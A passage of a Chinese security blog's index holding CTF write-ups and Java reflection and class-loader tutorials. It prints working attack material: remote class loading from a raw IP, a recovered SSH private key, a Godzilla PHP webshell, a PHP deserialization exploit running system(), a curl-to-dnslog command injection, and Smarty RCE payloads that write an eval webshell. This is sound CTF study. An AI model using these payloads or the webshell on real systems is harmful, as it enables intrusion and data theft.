Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } catch(Exception e) { e.printStackTrace(); } } } 然后在项目里远程加载这个类 import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class URLClassLoaderTest { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException { URL url = new URL(\"http://101.35.98.118:12424/javatest/\"); URLClassLoader cl = new URLClassLoader(new URL[]{url}); Class c = cl.loadClass(\"Test\"); c.newInstance(); } } ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:4:0","tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":["CTF"],"content":"Misc ","date":"2022-03-28","objectID":"/suctf2022/:0:0","tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/"},{"categories":["CTF"],"content":"Hi hacker 下载到是一个流量包，分析tcp流，发现是一个后面执行命令的 这里有一个文件jenkins_secret.zip 看下一个包里面，他进行了这样的操作 这看起来像是把文件发送的一个作用 分析icmp协议，找到这个secret文件 压缩文件是损坏的 binwalk分离一些，修复一下压缩包，总共就弄到了这些东西，还差了一些xml文件 这些应该是什么某种加密 这个是java的一个类似于插件的一个东西 org.jenkinsci.main.modules.instance_identity github：https://github.com/jenkinsci/instance-identity-plugin 在github搜了一下，找到了几个对应的文件 找到了一个jenkins的解密的一个项目 https://github.com/hoto/jenkins-credentials-decryptor 这几个文件在流量包里都能找到，但是xml文件一直提取不出来 他发送是只是一个数据包，但是这里他分了四块去传输，这样数据混乱了，我无法将他们重新拼接起来，不知道是从哪里断的 找了一下规律，第一个应该是由PK来开头的，猜测数据应该是由这里开始 每一个文件结尾都有个，猜测也是icmp传输的某个格式文本 而且只有最后第565个包里面是有压缩文件尾的，504b0506 所以我猜测是四个拼接起来合成完整的zip文件 我尝试和了一下，用winrar修复了一下 差一个global_config.xml，而且xml文件还是处于损坏状态，无法提取。。。 脱出四个分块，放一起对比一下，相同的尾 拼了很久很久发现，漏了几个包 主要看这里 过滤一下(icmp.ident == 135) \u0026\u0026 (ip.src == 172.17.0.2) 把8个包的data流拿出来，去掉头部和尾部再拼接 终于得到了完好的压缩包，xml文件算是拿到了 然后就是用刚才的工具 解密得到一个github是ssh私钥 还有一个hint 这里获取了ssh的私钥 -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- 流量包里面，第一个http流里面有这样的信息 所以接下来的目标就是利用这个私钥去拉取这个仓库 把私钥文件丢到~./ssh里面 然后用私钥去生成一个公钥 ssh-keygen -y -f id_rsa \u003e id_rsa.pub 然后就可以clone了 git clone Esonhugh@github:Esonhugh/secret_source_code.git 里面的文件就是http的第一个包的服务，没有flag，那就看一下git log，果然发现了端倪 都看了一下，发现flag是在source1里面 DASCTF{Oh!_H4ck_f0r_c0d3s-and_4buse_1t} ","date":"2022-03-28","objectID":"/suctf2022/:1:0","tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/"},{"categories":["CTF"],"content":"月圆之夜 其实就是找一个映射的关系 比如机械师是mechanic，对应了他的字母，然后翻译出来对应回去就是了 mechanic werewolf magician knight soul hunter n witch nun apothecary Ranger 对比一下flag dasctf{welcometothefullmoonnight} ","date":"2022-03-28","objectID":"/suctf2022/:2:0","tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/"},{"categories":["CTF"],"content":"什么奇奇怪怪的东西 打开有一个mrf文件，MRF 文件是由 Bartels Media Mouse Recorder 创建的数据文件 还有一个flag.zip，里面有一个vhd文件，也被加密了 在这里下载一个MouseRecorder https://www.macrorecorder.com/download/ 这里记录了一些鼠标操作记录 打开画图，然后让他画出来 结果是397643258669 用这个密码去解开压缩包，拿到vhd文件，挂载上以后，里面有这么些文件 ppt里面有这么一段字符 9876543210/.-,+*)E'CB;:?\u003e=\u003c;4Xyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONML xlsx里面的内容 KJIHGFED`B^]V[TYXWVUNrLQJONMLKDh+*)('\u0026\u003cA@?8=\u003c;:92Vwvutsrqponmlkjihgfedcba`_^ txt里面的内容 '\u0026B$:?8=\u003c;:3W76/4-Qrqponmlkjihgfedcbawv{zyxwvutsl2poQmle+LKJIHGcE[`YX]V[ZSw: 看这个图片的16进制，在末尾接了一段数据，是png的反转89054e74 提取出来反转一下，解出来是半个二维码 原png的文件名解码是flag4 ","date":"2022-03-28","objectID":"/suctf2022/:3:0","tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/"},{"categories":["CTF"],"content":"Au5t1n的秘密 中间有http流，貌似是扫描了一下目录 在1994组里面，貌似是扫到了后台 这里用admin:admin貌似登陆进去了 进后台后进行了一个上传操作，这里提示了密钥是key is key1** 传了文件名为key.php.mod 第二次上传 内容是一个木马，didi.php，是一个哥斯拉马子，但是好像还改过 \u003c?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName='payload'; $key='093c1c388069b7e1'; $data=file_get_contents(\"php://input\"); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); eval($payload); echo encode(@run($data),$key); }else{ if (stripos($data,\"getBasicsInfo\")!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 继续往后翻，找到对这个后面的利用了 被加密了，解一下哥斯拉的加密才行 写一个脚本逆一下 \u003c?php function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName='payload'; $key='093c1c388069b7e1'; $data='1d430243025e5d4c55444a5f56174351401b4a0a6e391c6763736a5f56174351401b4a0a6e395e4d5e554d0b580b11424c5d4b15135e4b114b3b3342174511425c7 。 。（省略） 。 70657304a4b4c555b7f1759061919023e69114f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a2031390d0a0d0a545617590c5776595d533b66376531445c4017'; echo encode(hex2bin($data),$key); 解密拿到源码，这就是哥斯拉注入的一些东西，不用管 $parameters=array(); $_SES=array(); function run($pms){ reDefSystemFunc(); $_SES=\u0026getSession(); @session_start(); $sessioId=md5(session_id()); if (isset($_SESSION[$sessioId])){ $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId))); } @session_write_close(); if (canCallGzipDecode()==1\u0026\u0026@isGzipStream($pms)){ $pms=gzdecode($pms); } formatParameter($pms); if 。 。（省略） 。 strlen($string); $i++){ array_push($bytes,ord($string[$i])); } return $bytes; } 再看看他其他的操作，这个流里面就是一些加载配置的操作了 后面的包，流量就解不出了，不知道为啥 他们有一个特征就是都有一个这样的头 我怀疑是不是有一个什么格式，后来去了解了一下哥斯拉的木马，发现在Godzillas v3.03以后对发送以及返回流量增加了gzip压缩，我把脚本一改 \u003c?php function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName='payload'; $key='093c1c388069b7e1'; $data=''; echo bin2hex(encode(hex2bin($data),$key)); 看一下文件头，哦豁，真是gzip压缩的格式 这样就可以拉去gzip -d解压了 解压出来，果然有数据！！ 然后就可以去试了 在当前目录发现了flag.zip，时间还是2022的 然后就是一个个的去试，在2079号包里面，找到了相关信息 上面的解密得到，这是他文件上传的表单，我们就可以拿下这个flag.zip了 但是他有一个密码，密码为password is md5(Godzilla' key)，那找key就是最后的一步了 key进行md5后的前16位为 093c1c388069b7e1 写一个脚本爆破一下 import string import hashlib def md5(s): return hashlib.md5(s.encode(encoding='utf-8')).hexdigest() s = string.printable k = 'key1' for a in s: for b in s: for c in s: key = k+a+b+c if(md5(key)[0:16]==\"093c1c388069b7e1\"): print(key) break md5加密以后解开压缩包拿到flag 093c1c388069b7e18bb4e898fc5ee049 Web ","date":"2022-03-28","objectID":"/suctf2022/:4:0","tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/"},{"categories":["CTF"],"content":"ezpop 题目给了如下代码 \u003c?php class crow { public $v1; public $v2; function eval() { echo new $this-\u003ev1($this-\u003ev2); } public function __invoke() { $this-\u003ev1-\u003eworld(); } } class fin { public $f1; public function __destruct() { echo $this-\u003ef1 . '114514'; } public function run() { ($this-\u003ef1)(); } public function __call($a, $b) { echo $this-\u003ef1-\u003eget_flag(); } } class what { public $a; public function __toString() { $this-\u003ea-\u003erun(); return 'hello'; } } class mix { public $m1; public function run() { ($this-\u003em1)(); } public function get_flag() { eval('#' . $this-\u003em1); } } 入口的类肯定是fin，最后的目的肯定是在mix里面的get_flag方法里面去执行eval函数 get_flag的入口也在fin里面，是fin的__call函数，而能调用call的只有一个地方，就是crow的__invoke函数 那能调用invoke的地方这里就有很多了 fin里面的run方法 或者mix的run方法 这里不知道从哪里开始分析，那就先看入口fin的__destruct函数，这里进行了一个字符串拼接，那么就是会触发一个__toString方法了 toString方法只有what有，那么f1的值就应该是what了 这里进what的tostring以后会调用run方法，这里就有分支了，但是感觉两个都用得到，所以可能是利用了这个trick，[class,func]去跳转到crow的eval方法 一开始想着要把所有方法都连接上。所以这样想的 new fin(new what(new fin([new crow(new what(1),new mix(new crow(new fin(new mix(1)),1))),\"eval\"]))) 但是发现tostring会比析构还先执行，导致打不通， 然后发现是不是我想复杂了，直接用这个小trick连上get_flag方法就能直接执行了。。。 这里还耍我一轮 写马写不了 直接看当前目录 这里又耍我一轮 拿到flag 最后的poc \u003c?php class crow { public $v1; public $v2; public function __construct($a,$b){ $this-\u003ev1 = $a; $this-\u003ev2 = $b; } function eval() { echo new $this-\u003ev1($this-\u003ev2); } public function __invoke() { $this-\u003ev1-\u003eworld(); } } class fin { public $f1; public function __construct($a){ $this-\u003ef1 = $a; } public function __destruct() { echo $this-\u003ef1 . '114514'; } public function run() { ($this-\u003ef1)(); } public function __call($a, $b) { echo $this-\u003ef1-\u003eget_flag(); } } class what { public $a; public function __construct($a){ $this-\u003ea = $a; } public function __toString() { $this-\u003ea-\u003erun(); return 'hello'; } } class mix { public $m1; public function __construct($a){ $this-\u003em1 = $a; } public function run() { ($this-\u003em1)(); } public function get_flag() { eval('#' .$this-\u003em1); } } #$ser = new fin(new what(new fin([new crow(new what(1),new mix(new crow(new fin(new mix(1)),1))),\"eval\"]))); $ser = new fin(new what(new fin([new mix('?\u003e\u003c?php system(\"cat H0mvz*\");?\u003e'),'get_flag']))); echo urlencode(serialize($ser)); ","date":"2022-03-28","objectID":"/suctf2022/:5:0","tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/"},{"categories":["CTF"],"content":"calc 题目给了源码 #coding=utf-8 from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory import random from urllib import parse import os from werkzeug.utils import secure_filename import time app=Flask(__name__) def waf(s): blacklist = ['import','(',')',' ','_','|',';','\"','{','}','\u0026','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__'] flag = True for no in blacklist: if no.lower() in s.lower(): flag= False print(no) break return flag @app.route(\"/\") def index(): \"欢迎来到SUctf2022\" return render_template(\"index.html\") @app.route(\"/calc\",methods=['GET']) def calc(): ip = request.remote_addr num = request.values.get(\"num\") log = \"echo {0} {1} {2}\u003e ./tmp/log.txt\".format(time.strftime(\"%Y%m%d-%H%M%S\",time.localtime()),ip,num) if waf(num): try: data = eval(num) os.system(log) except: pass return str(data) else: return \"waf!!\" if __name__ == \"__main__\": app.run(host='0.0.0.0',port=5000) 这里就是传了一个num参数进去，这里如果参数通过了waf，那么就会计算结果，并且system函数执行log，猜测这里是通过注入一些危险的命令去执行 这里有一个waf，过滤了很多东西 blacklist = ['import','(',')',' ','_','|',';','\"','{','}','\u0026','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__'] 但是由于命令执行没有回显，所以用dnslog，这样操作可以绕过 空格用%09代替 直接注入代码会报错，因为num代码会走进eval造成报错，所以需要加一个#作为注释符来绕过 1%23%60curl%09zeej2v.dnslog.cn%60 可以成功执行命令 试着反弹shell，直接执行弹shell不行，很多被过滤了，所以我们利用wget去传命令上去执行 ","date":"2022-03-28","objectID":"/suctf2022/:6:0","tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/"},{"categories":["CTF"],"content":"WEB ","date":"2022-03-24","objectID":"/hmgctf2022/:0:0","tags":null,"title":"[HMGCTF2022] WP","uri":"/hmgctf2022/"},{"categories":["CTF"],"content":"Fan website 首先是一个www.zip的源码泄露，是laminas框架 mvc的框架首先就是看路由 在\\module\\Album\\src\\Controller\\AlbumController.php里面有功能点 \u003c?php namespace Album\\Controller; use Album\\Model\\AlbumTable; use Laminas\\Mvc\\Controller\\AbstractActionController; use Laminas\\View\\Model\\ViewModel; use Album\\Form\\AlbumForm; use Album\\Form\\UploadForm; use Album\\Model\\Album; class AlbumController extends AbstractActionController { // Add this property: private $table; private $white_list; public function __construct(AlbumTable $table){ $this-\u003etable = $table; $this-\u003ewhite_list = array('.jpg','.jpeg','.png'); } public function indexAction() { return new ViewModel([ 'albums' =\u003e $this-\u003etable-\u003efetchAll(), ]); } public function addAction() { $form = new AlbumForm(); $form-\u003eget('submit')-\u003esetValue('Add'); $request = $this-\u003egetRequest(); if (! $request-\u003eisPost()) { return ['form' =\u003e $form]; } $album = new Album(); $form-\u003esetInputFilter($album-\u003egetInputFilter()); $form-\u003esetData($request-\u003egetPost()); if (! $form-\u003eisValid()) { return ['form' =\u003e $form]; } $album-\u003eexchangeArray($form-\u003egetData()); $this-\u003etable-\u003esaveAlbum($album); return $this-\u003eredirect()-\u003etoRoute('album'); } public function editAction() { $id = (int) $this-\u003eparams()-\u003efromRoute('id', 0); if (0 === $id) { return $this-\u003eredirect()-\u003etoRoute('album', ['action' =\u003e 'add']); } // Retrieve the album with the specified id. Doing so raises // an exception if the album is not found, which should result // in redirecting to the landing page. try { $album = $this-\u003etable-\u003egetAlbum($id); } catch (\\Exception $e) { return $this-\u003eredirect()-\u003etoRoute('album', ['action' =\u003e 'index']); } $form = new AlbumForm(); $form-\u003ebind($album); $form-\u003eget('submit')-\u003esetAttribute('value', 'Edit'); $request = $this-\u003egetRequest(); $viewData = ['id' =\u003e $id, 'form' =\u003e $form]; if (! $request-\u003eisPost()) { return $viewData; } $form-\u003esetInputFilter($album-\u003egetInputFilter()); $form-\u003esetData($request-\u003egetPost()); if (! $form-\u003eisValid()) { return $viewData; } $this-\u003etable-\u003esaveAlbum($album); // Redirect to album list return $this-\u003eredirect()-\u003etoRoute('album', ['action' =\u003e 'index']); } public function deleteAction() { $id = (int) $this-\u003eparams()-\u003efromRoute('id', 0); if (!$id) { return $this-\u003eredirect()-\u003etoRoute('album'); } $request = $this-\u003egetRequest(); if ($request-\u003eisPost()) { $del = $request-\u003egetPost('del', 'No'); if ($del == 'Yes') { $id = (int) $request-\u003egetPost('id'); $this-\u003etable-\u003edeleteAlbum($id); } // Redirect to list of albums return $this-\u003eredirect()-\u003etoRoute('album'); } return [ 'id' =\u003e $id, 'album' =\u003e $this-\u003etable-\u003egetAlbum($id), ]; } public function imgdeleteAction() { $request = $this-\u003egetRequest(); if(isset($request-\u003egetPost()['imgpath'])){ $imgpath = $request-\u003egetPost()['imgpath']; $base = substr($imgpath,-4,4); if(in_array($base,$this-\u003ewhite_list)){ //白名单 @unlink($imgpath); }else{ echo 'Only Img File Can Be Deleted!'; } } } public function imguploadAction() { $form = new UploadForm('upload-form'); $request = $this-\u003egetRequest(); if ($request-\u003eisPost()) { // Make certain to merge the $_FILES info! $post = array_merge_recursive( $request-\u003egetPost()-\u003etoArray(), $request-\u003egetFiles()-\u003etoArray() ); $form-\u003esetData($post); if ($form-\u003eisValid()) { $data = $form-\u003egetData(); $base = substr($data[\"image-file\"][\"name\"],-4,4); if(in_array($base,$this-\u003ewhite_list)){ //白名单限制 $cont = file_get_contents($data[\"image-file\"][\"tmp_name\"]); if (preg_match(\"/\u003c\\?|php|HALT\\_COMPILER/i\", $cont )) { die(\"Not This\"); } if($data[\"image-file\"][\"size\"]\u003c3000){ die(\"The picture size must be more than 3kb\"); } $img_path = realpath(getcwd()).'/public/img/'.md5($data[\"image-file\"][\"name\"]).$base; echo $img_path; $form-\u003esaveImg($data[\"image-file\"][\"tmp_name\"],$img_path); }else{ echo 'Only Img Can Be Uploaded!'; } // Form is valid, save the form! //return $this-\u003eredirect()-\u003etoRoute('upload-form/success'); } } return ['form' =\u003e $form]; } } 首先是很明显是一个文件上传 public function imguploadAction() { $form = new UploadForm('upload-form'); $request = $this-\u003egetRequest(); if ($request-\u003eisPost()) ","date":"2022-03-24","objectID":"/hmgctf2022/:1:0","tags":null,"title":"[HMGCTF2022] WP","uri":"/hmgctf2022/"},{"categories":["CTF"],"content":"Smarty calculator 也是开局有一个www.zip的源码泄露，是Smarty模板引擎，看了一下版本是3.1.39 那么他说自己修改了这个模板，那么我们下载到源文件去比较一下 重点在这个文件：smarty_internal_compile_function.php 他修改了正则过滤 再看漏洞，网上搜了一轮，在3.1.38有一个代码注入漏洞，CVE-2021-26119和CVE-2021-26120国外有师傅分析过这个漏洞 很明显我们应该就是得走这个方向 我对比了一下38和39的文件的修改，他的修改就是在这个文件里增加了一个正则过滤 在我的测试下，这个payload是可以在3.1.38下打通的 {function+name='rce(){};system(\"id\");function+'}{/function} 打断点发现这个过滤的确会拦截，所以不能直接在3.1.39打通 preg_match('/[a-zA-Z0-9_\\x80-\\xff](.*)+$/', $_name) 赛后复现，发现可以从math这里入手 在function_math.php里面，有eval可以执行命令，但是这里有一个过滤 这个过滤如果没过去，那么就会进入到error出去 这个可以用八进制去绕过 可以看到生成了模板缓存文件，将执行的命令结果输出 payload： data={$poc=\"poc\"}{math equation=\"(\\\"\\\\163\\\\171\\\\163\\\\164\\\\145\\\\155\\\")(\\\"\\\\167\\\\150\\\\157\\\\141\\\\155\\\\151\\\")\"} 拿flag写个马就行了 file_put_contents(\"1.php\",\"\u003c?php eval($_POST['a']);?\u003e\") 转一下得到 eval:{$poc=\"poc\"}{math equation=\"(\\\"\\\\146\\\\151\\\\154\\\\145\\\\137\\\\160\\\\165\\\\164\\\\137\\\\143\\\\157\\\\156\\\\164\\\\145\\\\156\\\\164\\\\163\\\")(\\\"\\\\31\\\\2e\\\\70\\\\68\\\\70\\\",\\\"\\\\74\\\\77\\\\160\\\\150\\\\160\\\\40\\\\145\\\\166\\\\141\\\\154\\\\50\\\\44\\\\137\\\\120\\\\117\\\\123\\\\124\\\\133\\\\47\\\\141\\\\47\\\\135\\\\51\\\\73\\\\77\\\\76\\\")\"} 但是这个就很奇怪，这样执行命令的话就不会经过他所修改的正则的方法里面，这是算一个非预期解吗 Misc ","date":"2022-03-24","objectID":"/hmgctf2022/:2:0","tags":null,"title":"[HMGCTF2022] WP","uri":"/hmgctf2022/"},{"categories":["CTF"],"content":"MissingFile 直接文本搜索都有flag了 ","date":"2022-03-24","objectID":"/hmgctf2022/:3:0","tags":null,"title":"[HMGCTF2022] WP","uri":"/hmgctf2022/"},{"categories":["CTF"],"content":"重要系统（复现） 有键盘流量 连接上ssh后，不需要提权能直接grep到flag。。。 ","date":"2022-03-24","objectID":"/hmgctf2022/:4:0","tags":null,"title":"[HMGCTF2022] WP","uri":"/hmgctf2022/"},{"categories":["Java"],"content":"前言 准备入手学习java的安全了，感觉这也是一个大的趋势，想着尽早进入到java安全的探索中，在反序列化链的学习之前，需要先学习反射，不多说了，开干吧 反射 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:0:0","tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/"},{"categories":["Java"],"content":"反射定义 对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有） 通过java语言中的反射机制可以操作字节码文件，可以读和修改字节码文件 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:1:0","tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/"},{"categories":["Java"],"content":"反射的基本运用 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:0","tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/"},{"categories":["Java"],"content":"1. 获取类对象 a. forName()方法 只需要知道类名，在加载JDBC的时候会采用 实例代码 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); } } b. 直接获取 使用.class去获取对于的对象 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class\u003c?\u003e name = Runtime.class; System.out.println(name); } } c. getClass()方法 getClass来获取字节码对象，必须要明确具体的类，然后创建对象 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Runtime rt = Runtime.getRuntime(); Class\u003c?\u003e name = rt.getClass(); System.out.println(name); } } d. getSystemClassLoader().loadClass()方法 这个方法和forName类似，只要有类名就可以了，但是区别在于，forName的静态JVM会装载类，并执行static()中的代码 public class getSystemClassLoader { public static void main(String[] args) throws ClassNotFoundException { Class\u003c?\u003e name = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\"); System.out.println(name); } } ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:1","tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/"},{"categories":["Java"],"content":"2. 获取类方法 a. getDeclaredMethods 返回类或接口声明的所有方法，包括public、protected、private和默认方法，但是不包括继承的方法 import java.lang.reflect.Method; public class getDeclaredMethods { public static void main(String[] args) throws ClassNotFoundException { Class\u003c?\u003e name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); Method[] m = name.getDeclaredMethods(); for(Method x:m) System.out.println(x); } } b. getDeclaredMethod 获取特定的方法，第一个参数是方法名，第二个参数是该方法的参数对应的class对象，例如这里Runtime的exec方法参数为一个String，所以这里的第二个参数是String.class import java.lang.reflect.Method; public class getDeclaredMethod { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException { Class\u003c?\u003e name = Class.forName(\"java.lang.Runtime\"); Method m = name.getDeclaredMethod(\"exec\",String.class); System.out.println(m); } } c. getMethods 返回某个类所有的public方法，包括继承类的public方法 d. getMethod 参数同理getDeclaredMethod ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:2","tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/"},{"categories":["Java"],"content":"3. 获取成员变量 同理Method的那几个方法 a. getDeclaredFields 获取类的成员的所有变量数组，但是不包括父类的 b. getDeclaredField(String name) 获取特定的，参数是想要的方法的名称 c. getFields() 同理，只能获得public的，但是包括了父类的 d. getField(String name) 同理，参数是想要的方法的名称 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:3","tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/"},{"categories":["Java"],"content":"4. 获取构造函数Constructor Constructor\u003c?\u003e[] getConstructors() ：只返回public构造函数 Constructor\u003c?\u003e[] getDeclaredConstructors() ：返回所有构造函数 Constructor\u003c\u003e getConstructor(类\u003c?\u003e... parameterTypes) : 匹配和参数配型相符的public构造函数 Constructor\u003c\u003e getDeclaredConstructor(类\u003c?\u003e... parameterTypes) ： 匹配和参数配型相符的构造函数 后面两个方法的参数是对于方法的参数的类型的class对象，和Method的那个类似，例如String.class ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:4","tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/"},{"categories":["Java"],"content":"5. 反射创建类对象 newInstance 可以通过反射来生成实例化对象，一般我们使用Class对象的newInstance()方法来进行创建类对象 创建的方法就是：只需要通过forname方法获取到的class对象中进行newInstance方法创建即可 Class c = Class.forName(\"com.reflect.MethodTest\"); // 创建Class对象 Object m1 = c.newInstance(); // 创建类对象 invoke invoke方法位于java.lang.reflect.Method类中，用于执行某个的对象的目标方法,一般会和getMethod方法配合进行调用。 使用用法： public Object invoke(Object obj, Object... args) 第一个参数为类的实例，第二个参数为相应函数中的参数 obj：从中调用底层方法的对象，必须是实例化对象 